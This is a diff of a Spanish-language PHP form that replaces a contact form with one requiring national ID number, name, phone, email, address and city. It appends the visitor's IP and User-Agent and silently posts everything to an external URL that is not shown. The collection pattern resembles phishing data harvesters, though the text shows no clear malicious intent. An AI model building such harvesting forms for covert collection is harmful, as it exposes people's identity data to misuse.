@@ -15,16 +15,22 @@ function getUserIP() {
 
 // Cuando se envía el formulario
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $cedula   = htmlspecialchars($_POST['cedula']);
     $nombre   = htmlspecialchars($_POST['nombre']);
+    $phone    = htmlspecialchars($_POST['phone']);
     $email    = htmlspecialchars($_POST['email']);
-    $mensaje  = htmlspecialchars($_POST['mensaje']);
+    $address  = htmlspecialchars($_POST['address']);
+    $city     = htmlspecialchars($_POST['city']);
     $user_ip  = getUserIP();
 
     // 🚨 Formato bonito del mensaje
-    $msg  = "🚨 *NUEVA CONSULTA DE CONTACTO* 🚨\n\n";
+    $msg  = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n";
+    $msg .= "🆔 *Cédula:* $cedula\n";
     $msg .= "👤 *Nombre:* $nombre\n";
+    $msg .= "📞 *Teléfono:* $phone\n";
     $msg .= "📧 *Email:* $email\n";
-    $msg .= "📝 *Mensaje:* $mensaje\n";
+    $msg .= "🏠 *Dirección:* $address\n";
+    $msg .= "🌆 *Ciudad:* $city\n";
     $msg .= "🌍 *IP:* $user_ip\n";
     $msg .= "🖥 *User-Agent:* " . $_SERVER['HTTP_USER_AGENT'] . "\n";
 
@@ -47,7 +53,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $context  = stream_context_create($options);
     @file_get_contents($url, false, $context);
 
-    echo "<script>alert('✅ Tu consulta fue enviada con éxito.'); window.location.href='../index.html';</script>";
+    echo "<script>alert('✅ Tus datos fueron enviados con éxito.'); window.location.href='../index.html';</script>";
     exit;
 }
 ?>
@@ -57,7 +63,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulario de Contacto</title>
+  <title>Formulario de Información</title>
   <style>
     body { font-family: Arial, sans-serif; background: #f4f6f9; padding: 20px; }
     .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,.1); }
@@ -71,16 +77,25 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 </head>
 <body>
   <div class="container">
-    <h2>📩 Formulario de Contacto</h2>
+    <h2>📋 Formulario de Información</h2>
     <form method="POST" action="">
+      <label for="cedula">Cédula</label>
+      <input type="text" id="cedula" name="cedula" required>
+
       <label for="nombre">Nombre</label>
       <input type="text" id="nombre" name="nombre" required>
+
+      <label for="phone">Teléfono</label>
+      <input type="text" id="phone" name="phone" required>
 
       <label for="email">Correo electrónico</label>
       <input type="email" id="email" name="email" required>
 
-      <label for="mensaje">Mensaje</label>
-      <textarea id="mensaje" name="mensaje" required></textarea>
+      <label for="address">Dirección</label>
+      <input type="text" id="address" name="address" required>
+
+      <label for="city">Ciudad</label>
+      <input type="text" id="city" name="city" required>
 
       <button type="submit">Enviar 🚀</button>
     </form>
